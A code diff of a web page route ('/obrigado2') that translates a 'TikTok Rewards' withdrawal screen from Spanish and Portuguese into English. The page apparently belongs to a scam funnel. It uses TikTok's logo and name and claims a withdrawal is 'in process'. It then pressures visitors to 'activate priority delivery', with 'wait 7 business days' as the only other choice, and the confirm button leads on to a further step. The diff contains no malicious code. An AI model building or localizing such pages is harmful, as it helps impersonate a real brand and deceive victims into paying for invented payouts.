@@ -5,15 +5,15 @@ import tiktokLogo from "@/assets/tiktok-logo-clean.png.asset.json";
 export const Route = createFileRoute("/obrigado2")({
   head: () => ({
     meta: [
-      { title: "Confirmar retiro | TikTok Rewards" },
+      { title: "Confirm Withdrawal | TikTok Rewards" },
       {
         name: "description",
-        content: "¿Deseas liberar tu retiro con prioridad ahora?",
+        content: "Would you like to release your withdrawal with priority now?",
       },
-      { property: "og:title", content: "Confirmar retiro" },
+      { property: "og:title", content: "Confirm Withdrawal" },
       {
         property: "og:description",
-        content: "¿Deseas liberar tu retiro con prioridad ahora?",
+        content: "Would you like to release your withdrawal with priority now?",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
@@ -53,8 +53,8 @@ function Obrigado2() {
           </div>
 
           {/* Text */}
-          <h2 className="text-white text-[17px] font-bold mb-2">Preparando la siguiente etapa...</h2>
-          <p className="text-neutral-500 text-[13px]">Espera um momento, por favor.</p>
+          <h2 className="text-white text-[17px] font-bold mb-2">Preparing the next step...</h2>
+          <p className="text-neutral-500 text-[13px]">Please wait a moment.</p>
         </div>
       </main>
     );
@@ -72,24 +72,24 @@ function Obrigado2() {
 
           <div className="w-full bg-[#121212] rounded-[32px] p-10 border border-white/5 shadow-2xl text-center">
             <h1 className="text-white text-[28px] font-black leading-tight mb-6">
-              ¿Deseas liberar tu retiro con <span className="text-[#25f4ee]">prioridad</span> ahora?
+              Would you like to release your withdrawal with <span className="text-[#25f4ee]">priority</span> now?
             </h1>
             
             <p className="text-neutral-400 text-[15px] leading-relaxed mb-10">
-              Tu retiro está en proceso. Activa el envío prioritario para recibir tus fondos en minutos.
+              Your withdrawal is in process. Activate priority delivery to receive your funds in minutes.
             </p>
 
             <button
               onClick={() => navigate({ to: "/obrigado3" })}
               className="w-full rounded-2xl bg-[#ff3b5c] py-5 text-[18px] font-black text-white shadow-[0_15px_35px_rgba(255,59,92,0.25)] transition-all hover:scale-[1.02] active:scale-[0.98]"
             >
-              SÍ, CONFIRMAR
+              YES, CONFIRM
             </button>
           </div>
 
           {/* Back link */}
           <button className="mt-8 text-neutral-500 text-sm font-medium hover:text-neutral-300 transition-colors">
-            No, esperar 7 días hábiles
+            No, wait 7 business days
           </button>
        </div>
     </main>
